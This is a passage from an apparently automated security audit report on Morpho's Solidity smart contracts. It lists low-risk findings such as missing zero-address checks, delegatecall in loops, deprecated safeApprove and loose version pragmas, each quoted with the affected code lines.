[43](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L43), [44](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L44)

```solidity
File: morpho-blue-bundlers/src/StEthBundler.sol

34:         WST_ETH = wstEth;

```

[34](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L34)



### Missing checks for `address(0)` in function when assigning values to address state variables

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

*Instances (6)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

189:         curator = newCurator;

207:         skimRecipient = newSkimRecipient;

758:         guardian = newGuardian;

```

[189](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L189), [207](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L207), [758](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L758)

```solidity
File: morpho-blue/src/Morpho.sol

98:         owner = newOwner;

142:         feeRecipient = newFeeRecipient;

```

[98](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L98), [142](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L142)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

194:         owner = newOwner;

```

[194](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L194)



### Array indicies should be referenced via enums rather than via numeric literals

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Create a commented enum value to use instead of constant array indexes, this makes the code far easier to understand

*Instances (10)*:
<details>
<summary>see instances</summary>


```solidity
File: morpho-blue/src/libraries/periphery/MorphoLib.sol

15:         return uint256(morpho.extSloads(slot)[0]);

20:         return uint128(uint256(morpho.extSloads(slot)[0]));

25:         return uint256(morpho.extSloads(slot)[0] >> 128);

30:         return uint128(uint256(morpho.extSloads(slot)[0]));

35:         return uint256(morpho.extSloads(slot)[0] >> 128);

40:         return uint128(uint256(morpho.extSloads(slot)[0]));

45:         return uint256(morpho.extSloads(slot)[0] >> 128);

50:         return uint128(uint256(morpho.extSloads(slot)[0]));

55:         return uint256(morpho.extSloads(slot)[0] >> 128);

60:         res[0] = x;

```

[15](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L15), [20](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L20), [25](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L25), [30](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L30), [35](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L35), [40](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L40), [45](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L45), [50](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L50), [55](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L55), [60](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L60)




### Using `delegatecall` inside a loop

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Using `delegatecall` in a `for` loop can lead to high gas costs, as `delegatecall` is an expensive operation and its costs compound when used in a loop. Additionally, it can pose security risks including reentrancy attacks, as it executes code in the calling contract's context. The function selector collisions can also lead to unpredictable behaviour. To mitigate these risks, control the loop's iterations, apply a reentrancy guard, strictly audit contracts called via `delegatecall`, and consider alternatives like call or proxy patterns if the use case allows. Always thoroughly vet contracts involved in `delegatecall` operations.

*Instances (1)*:

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

/// @audit line 67
66:         for (uint256 i; i < data.length; ++i) {
67:                (bool success, bytes memory returnData) = address(this).delegatecall(data[i]);
68:    
69:                // No need to check that `address(this)` has code in case of success.
70:                if (!success) _revert(returnData);
71:            }

```

[66-71](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L66-L71)



### `safeApprove()` is deprecated	_(duplicate of [Use `increaseAllowance()`/`decreaseAllowance()` instead of `approve()`/`safeApprove()`])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`. If only setting the initial allowance to the value that means infinite, `safeIncreaseAllowance()` can be used instead. The function may currently work, but if a bug is found in this version of OpenZeppelin, and the version that you're forced to upgrade to no longer has this function, you'll encounter unnecessary delays in porting and testing replacement contracts.

*Instances (2)*:

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

95:             ERC20(asset).safeApprove(spender, type(uint256).max);

```

[95](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L95)

```solidity
File: morpho-blue-bundlers/src/StEthBundler.sol

36:         ERC20(ST_ETH).safeApprove(WST_ETH, type(uint256).max);

```

[36](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L36)



### Code does not follow the best practice of check-effects-interaction

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Code should follow the best-practice of [check-effects-interaction](https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-11-coding-patterns/topic/checks-effects-interactions/), where state variables are updated before any external calls are made. Doing so prevents a large class of reentrancy bugs.

*Instances (3)*:


```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit supplyShares() called prior to this
378:                 delete config[id];

/// @audit supplyShares called prior to this assignment
382:         withdrawQueue = newWithdrawQueue;

```

[378](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L378), [382](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L382)

```solidity
File: morpho-blue-bundlers/src/StEthBundler.sol

/// @audit stETH called prior to this assignment
34:         WST_ETH = wstEth;

```

[34](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L34)





### Double type casts create complexity within the code

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Double type casting should be avoided in Solidity contracts to prevent unintended consequences and ensure accurate data representation. Performing multiple type casts in succession can lead to unexpected truncation, rounding errors, or loss of precision, potentially compromising the contract's functionality and reliability. Furthermore, double type casting can make the code less readable and harder to maintain, increasing the likelihood of errors and misunderstandings during development and debugging. To ensure precise and consistent data handling, developers should use appropriate data types and avoid unnecessary or excessive type casting, promoting a more robust and dependable contract execution.

*Instances (4)*:

```solidity
File: morpho-blue/src/libraries/periphery/MorphoLib.sol

20:         return uint128(uint256(morpho.extSloads(slot)[0]));

30:         return uint128(uint256(morpho.extSloads(slot)[0]));

40:         return uint128(uint256(morpho.extSloads(slot)[0]));

50:         return uint128(uint256(morpho.extSloads(slot)[0]));

```

[20](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L20), [30](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L30), [40](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L40), [50](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/periphery/MorphoLib.sol#L50)



### Emitting storage values instead of the memory one

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Emitted values should not be read from storage again. Instead, the existing values from memory should be used.

*Instances (1)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit fee
244:         emit EventsLib.SetFee(_msgSender(), fee);

```

[244](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L244)




### Unused/empty `receive`/`fallback`

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth)))`.

*Instances (1)*:

```solidity
File: morpho-blue-bundlers/src/WNativeBundler.sol

39:     receive() external payable {}

```

[39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L39)




### No access control on `receive`/`payable fallback`

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Having no access control on the function means that someone may send Ether to the contract, and have no way to get anything back out, which is a loss of funds. If the concern is having to spend a small amount of gas to check the sender against an immutable address, the code should at least have a function to rescue unused Ether.

*Instances (1)*:

```solidity
File: morpho-blue-bundlers/src/WNativeBundler.sol

39:     receive() external payable {}

```

[39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L39)




### Use `increaseAllowance()`/`decreaseAllowance()` instead of `approve()`/`safeApprove()`

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Changing an allowance with `approve()` brings the risk that someone may use both the old and the newallowance by unfortunate transaction ordering. Refer to [ERC20 API: An Attack Vector on the Approve/TransferFrom](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM) Methods. It is recommended to use the `increaseAllowance()`/`decreaseAllowance()` to avoid this problem.

*Instances (2)*:

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

95:             ERC20(asset).safeApprove(spender, type(uint256).max);

```

[95](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L95)

```solidity
File: morpho-blue-bundlers/src/StEthBundler.sol

36:         ERC20(ST_ETH).safeApprove(WST_ETH, type(uint256).max);

```

[36](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L36)




### Large approvals may not work with some `ERC20` tokens	_(duplicate of [Large transfers may not work with some `ERC20` tokens])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Not all `IERC20` implementations are totally compliant, and some (e.g `UNI`, `COMP`) may fail if the valued passed is larger than uint96. [Source](https://github.com/d-xo/weird-erc20#revert-on-large-approvals--transfers)

*Instances (2)*:

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

95:             ERC20(asset).safeApprove(spender, type(uint256).max);

```

[95](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L95)

```solidity
File: morpho-blue-bundlers/src/StEthBundler.sol

36:         ERC20(ST_ETH).safeApprove(WST_ETH, type(uint256).max);

```

[36](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L36)



### Large transfers may not work with some `ERC20` tokens

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Some `IERC20` implementations (e.g `UNI`, `COMP`) may fail if the valued transferred is larger than `uint96`. [Source](https://github.com/d-xo/weird-erc20#revert-on-large-approvals--transfers)

*Instances (3)*:


```solidity
File: metamorpho/src/MetaMorpho.sol

518:         IERC20(token).safeTransfer(skimRecipient, amount);

```

[518](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L518)

```solidity
File: morpho-blue-bundlers/src/TransferBundler.sol

51:         ERC20(asset).safeTransfer(recipient, amount);

```

[51](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L51)


```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

133:         ERC20(reward).safeTransfer(account, amount);

```

[133](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L133)




### For loops in `public` or `external` functions should be avoided due to high gas costs and possible DOS

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

In Solidity, for loops can potentially cause Denial of Service (DoS) attacks if not handled carefully. DoS attacks can occur when an attacker intentionally exploits the gas cost of a function, causing it to run out of gas or making it too expensive for other users to call. Below are some scenarios where for loops can lead to DoS attacks: Nested for loops can become exceptionally gas expensive and should be used sparingly.

*Instances (5)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit on line 330
325:     function setSupplyQueue(Id[] calldata newSupplyQueue) external onlyAllocatorRole {
326:             uint256 length = newSupplyQueue.length;
327:     
328:             if (length > ConstantsLib.MAX_QUEUE_LENGTH) revert ErrorsLib.MaxQueueLengthExceeded();
329:     
330:             for (uint256 i; i < length; ++i) {
331:                 if (config[newSupplyQueue[i]].cap == 0) revert ErrorsLib.UnauthorizedMarket(newSupplyQueue[i]);
332:             }
333:     
334:             supplyQueue = newSupplyQueue;
335:     
336:             emit EventsLib.SetSupplyQueue(_msgSender(), newSupplyQueue);
337:         }

/// @audit on lines 353, 364
346:     function updateWithdrawQueue(uint256[] calldata indexes) external onlyAllocatorRole {
347:             uint256 newLength = indexes.length;
348:             uint256 currLength = withdrawQueue.length;
349:     
350:             bool[] memory seen = new bool[](currLength);
351:             Id[] memory newWithdrawQueue = new Id[](newLength);
352:     
353:             for (uint256 i; i < newLength; ++i) {
354:                 uint256 prevIndex = indexes[i];
355:     
356:                 // If prevIndex >= currLength, it will revert with native "Index out of bounds".
357:                 Id id = withdrawQueue[prevIndex];
358:                 if (seen[prevIndex]) revert ErrorsLib.DuplicateMarket(id);
359:                 seen[prevIndex] = true;
360:     
361:                 newWithdrawQueue[i] = id;
362:             }
363:     
364:             for (uint256 i; i < currLength; ++i) {
365:                 if (!seen[i]) {
366:                     Id id = withdrawQueue[i];
367:     
368:                     if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);
369:     
370:                     if (MORPHO.supplyShares(id, address(this)) != 0) {
371:                         if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);
372:     
373:                         if (block.timestamp < config[id].removableAt) {
374:                             revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
375:                         }
376:                     }
377:     
378:                     delete config[id];
379:                 }
380:             }
381:     
382:             withdrawQueue = newWithdrawQueue;
383:     
384:             emit EventsLib.SetWithdrawQueue(_msgSender(), newWithdrawQueue);
385:         }

/// @audit on line 400
397:     function reallocate(MarketAllocation[] calldata allocations) external onlyAllocatorRole {
398:             uint256 totalSupplied;
399:             uint256 totalWithdrawn;
400:             for (uint256 i; i < allocations.length; ++i) {
401:                 MarketAllocation memory allocation = allocations[i];
402:                 Id id = allocation.marketParams.id();
403:     
404:                 (uint256 supplyAssets, uint256 supplyShares,) = _accruedSupplyBalance(allocation.marketParams, id);
405:                 uint256 withdrawn = supplyAssets.zeroFloorSub(allocation.assets);
406:     
407:                 if (withdrawn > 0) {
408:                     if (allocation.marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);
409:     
410:                     // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.
411:                     uint256 shares;
412:                     if (allocation.assets == 0) {
413:                         shares = supplyShares;
414:                         withdrawn = 0;
415:                     }
416:     
417:                     (uint256 withdrawnAssets, uint256 withdrawnShares) =
418:                         MORPHO.withdraw(allocation.marketParams, withdrawn, shares, address(this), address(this));
419:     
420:                     emit EventsLib.ReallocateWithdraw(_msgSender(), id, withdrawnAssets, withdrawnShares);
421:     
422:                     totalWithdrawn += withdrawnAssets;
423:                 } else {
424:                     uint256 suppliedAssets = allocation.assets == type(uint256).max
425:                         ? totalWithdrawn.zeroFloorSub(totalSupplied)
426:                         : allocation.assets.zeroFloorSub(supplyAssets);
427:     
428:                     if (suppliedAssets == 0) continue;
429:     
430:                     uint256 supplyCap = config[id].cap;
431:                     if (supplyCap == 0) revert ErrorsLib.UnauthorizedMarket(id);
432:     
433:                     if (supplyAssets + suppliedAssets > supplyCap) revert ErrorsLib.SupplyCapExceeded(id);
434:     
435:                     // The market's loan asset is guaranteed to be the vault's asset because it has a non-zero supply cap.
436:                     (, uint256 suppliedShares) =
437:                         MORPHO.supply(allocation.marketParams, suppliedAssets, 0, address(this), hex"");
438:     
439:                     emit EventsLib.ReallocateSupply(_msgSender(), id, suppliedAssets, suppliedShares);
440:     
441:                     totalSupplied += suppliedAssets;
442:                 }
443:             }
444:     
445:             if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();
446:         }

/// @audit on line 614
613:     function totalAssets() public view override returns (uint256 assets) {
614:             for (uint256 i; i < withdrawQueue.length; ++i) {
615:                 assets += MORPHO.expectedSupplyAssets(_marketParams(withdrawQueue[i]), address(this));
616:             }
617:         }

```

[325-337](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L325-L337), [346-385](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L346-L385), [397-446](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L397-L446), [613-617](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L613-L617)

```solidity
File: morpho-blue/src/Morpho.sol

/// @audit on line 535
530:     function extSloads(bytes32[] calldata slots) external view returns (bytes32[] memory res) {
531:             uint256 nSlots = slots.length;
532:     
533:             res = new bytes32[](nSlots);
534:     
535:             for (uint256 i; i < nSlots;) {
536:                 bytes32 slot = slots[i++];
537:     
538:                 assembly ("memory-safe") {
539:                     mstore(add(res, mul(i, 32)), sload(slot))
540:                 }
541:             }
542:         }

```

[530-542](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L530-L542)




### Int casting `block.timestamp` can reduce the lifespan of a contract

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Consider removing casting to ensure future functionality.

*Instances (2)*:

```solidity
File: morpho-blue/src/Morpho.sol

157:         market[id].lastUpdate = uint128(block.timestamp);

494:         market[id].lastUpdate = uint128(block.timestamp);

```

[157](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L157), [494](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L494)



### Unsafe solidity low-level call can cause gas grief attack

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Using the low-level calls of a solidity address can leave the contract open to gas grief attacks. These attacks occur when the called contract returns a large amount of data. So when calling an external contract, it is necessary to check the length of the return data before reading/copying it (using `returndatasize()`).

*Instances (2)*:

```solidity
File: morpho-blue/src/libraries/SafeTransferLib.sol

/// @audit safeTransfer()
23:             address(token).call(abi.encodeCall(IERC20Internal.transfer, (to, value)));

/// @audit safeTransferFrom()
31:             address(token).call(abi.encodeCall(IERC20Internal.transferFrom, (from, to, value)));

```

[23](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/SafeTransferLib.sol#L23), [31](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/SafeTransferLib.sol#L31)




### External call recipient may consume all transaction gas

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

There is no limit specified on the amount of gas used, so the recipient can use up all of the transaction's gas, causing it to revert. Use `addr.call{gas: <amount>}("")` or [this](https://github.com/nomad-xyz/ExcessivelySafeCall) library instead

*Instances (1)*:

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

/// @audit _multicall()
67:             (bool success, bytes memory returnData) = address(this).delegatecall(data[i]);

```

[67](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L67)



### External calls in an un-bounded `for`-loop may result in a DOS

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Consider limiting the number of iterations in `for`-loops that make external calls

*Instances (1)*:

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

/// @audit _multicall()
67:             (bool success, bytes memory returnData) = address(this).delegatecall(data[i]);

```

[67](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L67)




### Missing contract existence checks before low-level calls

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Low-level calls return success if there is no code present at the specified address. In addition to the zero-address checks, add a check to verify that `<address>.code.length > 0`

*Instances (2)*:

```solidity
File: morpho-blue/src/libraries/SafeTransferLib.sol

/// @audit safeTransfer()
23:             address(token).call(abi.encodeCall(IERC20Internal.transfer, (to, value)));

/// @audit safeTransferFrom()
31:             address(token).call(abi.encodeCall(IERC20Internal.transferFrom, (from, to, value)));

```

[23](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/SafeTransferLib.sol#L23), [31](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/SafeTransferLib.sol#L31)




### Missing checks for `ecrecover()` signature malleability

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

`ecrecover()` accepts as valid, two versions of signatures, meaning an attacker can use the same signature twice, or an attacker may be able to front-run the original signer with the altered version of the signature, causing the signer's transaction to revert due to nonce reuse. Consider adding checks for signature malleability, or using OpenZeppelin's ECDSA library to perform the extra checks necessary in order to prevent malleability.

*Instances (1)*:

```solidity
File: morpho-blue/src/Morpho.sol

441:         address signatory = ecrecover(digest, signature.v, signature.r, signature.s);

```

[441](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L441)



### Missing checks in `constructor`/`initialize`

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

There are some missing checks in these functions, and this could lead to unexpected scenarios. Consider always adding a sanity check for state variables.

*Instances (1)*:

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

/// @audit  initialTimelock, initialRoot, initialIpfsHash
68:     constructor(address initialOwner, uint256 initialTimelock, bytes32 initialRoot, bytes32 initialIpfsHash) {
69:            _setOwner(initialOwner);
70:            _setTimelock(initialTimelock);
71:            _setRoot(initialRoot, initialIpfsHash);
72:        }

```

[68-72](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L68-L72)



### Missing limits when setting min/max amounts

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

There are some missing limits in these functions, and this could lead to unexpected scenarios. Consider adding a min/max limit for the following values, when appropriate.

*Instances (4)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

749:         timelock = newTimelock;

896:         lastTotalAssets = updatedTotalAssets;

```

[749](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L749), [896](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L896)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

131:         claimed[account][reward] = claimable;

201:         timelock = newTimelock;

```

[131](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L131), [201](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L201)




### Functions calling contracts with transfer hooks are missing reentrancy guards

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Even if the function follows the best practice of check-effects-interaction, not using a reentrancy guard when there may be transfer hooks will open the users of this protocol up to read-only reentrancies with no way to protect against it, except by block-listing the whole protocol.

```solidity
File: morpho-blue/src/Morpho.sol

/// @audit withdraw()
224:         IERC20(marketParams.loanToken).safeTransfer(receiver, assets);

/// @audit borrow()
260:         IERC20(marketParams.loanToken).safeTransfer(receiver, assets);

/// @audit withdrawCollateral()
338:         IERC20(marketParams.collateralToken).safeTransfer(receiver, assets);

/// @audit liquidate()
400:         IERC20(marketParams.collateralToken).safeTransfer(msg.sender, seizedAssets);

/// @audit flashLoan()
416:         IERC20(token).safeTransfer(msg.sender, assets);

```

[224](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L224), [260](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L260),  [338](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L338), [400](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L400), [416](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L416)




### Using `>`/`>=` without specifying an upper bound in version pragma is unsafe

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

There will be breaking changes in future versions of solidity, and at that point your code will no longer be compatible. While you may have the specific version to use in a configuration file, others that include your source files may not.

*Instances (15)*:


```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L2)

```solidity
File: metamorpho/src/interfaces/IMorphoMarketParams.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L2)

```solidity
File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IMorphoBundler.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMorphoBundler.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IMulticall.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IMulticall.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IStEth.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWNative.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L2)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L2)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

2: pragma solidity >=0.5.0;

```

[2](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L2)

```solidity
